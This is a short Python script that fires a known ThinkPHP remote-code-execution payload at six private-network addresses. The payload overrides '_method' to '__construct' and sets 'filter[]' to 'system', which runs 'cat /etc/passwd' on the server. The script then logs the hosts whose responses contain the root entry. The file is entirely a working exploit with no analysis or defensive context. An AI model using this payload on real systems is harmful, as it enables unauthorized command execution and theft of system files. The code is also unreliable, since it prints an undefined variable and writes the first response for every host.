import requests,re

url1="http://192.168.0.68:8001/index.php?s=captcha"
url2="https://192.168.0.96/index.php?s=captcha"
url3="http://192.168.0.68:8003/index.php?s=captcha"
url4="http://192.168.0.68:8002/index.php?s=captcha"
url5="https://192.168.0.77/index.php?s=captcha"
url6="https://192.168.0.97/index.php?s=captcha"


headers = {'Content-Type': 'application/x-www-form-urlencoded'}

data={"_method":"__construct","filter[]":"system","method":"get","server[REQUEST_METHOD]":"cat%20/etc/passwd"}

aa=requests.post(url1,headers=headers,data=data,verify=False).text
bb=requests.post(url2,headers=headers,data=data,verify=True).text
cc=requests.post(url3,headers=headers,data=data,verify=False).text
dd=requests.post(url4,headers=headers,data=data,verify=False).text
ee=requests.post(url5,headers=headers,data=data,verify=True).text
ff=requests.post(url6,headers=headers,data=data,verify=True).text

if "root:*:0:0" in str(aa):
        print ("yes",url)
        with open("ok.txt",'a+') as file: file.write(aa+'\n') 
else:
        pass

if "root:*:0:0" in str(bb):
        print ("yes",url)
        with open("ok.txt",'a+') as file: file.write(aa+'\n') 
else:
        pass


if "root:*:0:0" in str(cc):
        print ("yes",url)
        with open("ok.txt",'a+') as file: file.write(aa+'\n') 
else:
        pass
if "root:*:0:0" in str(dd):
        print ("yes",url)
        with open("ok.txt",'a+') as file: file.write(aa+'\n') 
else:
        pass

if "root:*:0:0" in str(ee):
        print ("yes",url)
        with open("ok.txt",'a+') as file: file.write(aa+'\n') 
else:
        pass


if "root:*:0:0" in str(ff):
        print ("yes",url)
        with open("ok.txt",'a+') as file: file.write(aa+'\n') 
else:
        pass
